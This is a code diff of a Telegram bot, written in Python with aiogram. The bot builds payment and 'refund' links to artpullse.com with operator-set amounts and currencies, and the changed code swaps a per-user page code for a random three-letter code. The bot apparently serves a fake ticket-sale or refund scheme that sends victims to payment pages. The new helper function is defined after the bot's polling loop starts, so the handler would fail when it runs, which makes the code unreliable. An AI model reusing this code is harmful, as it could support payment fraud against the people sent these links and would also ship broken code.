@@ -1352,13 +1352,11 @@ async def manual_payment_amount_handler(message: types.Message):
             payment_type = payment_type_by_uid.get(uid, 'refund')
             print(f"[DEBUG] manual_payment_amount_handler: payment_type={payment_type}, amount={amount}, currency={currency}")
             if payment_type == 'defolt':
-                page_code = get_page_code_for_user(uid)
-                page_param = f"&e={page_code}" if page_code else ""
-                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1{page_param}"
+                short_code = generate_short_code()
+                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&e={short_code}"
             else:
-                page_code = get_page_code_for_user(uid)
-                page_param = f"&e={page_code}" if page_code else ""
-                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}{page_param}"
+                short_code = generate_short_code()
+                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&e={short_code}"
             print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
@@ -2331,4 +2329,7 @@ if __name__ == '__main__':
         # aiogram polling
         await dp.start_polling(bot)
     asyncio.run(main())
+
+def generate_short_code(length=3):
+    return ''.join(random.choices(string.ascii_uppercase, k=length))
 
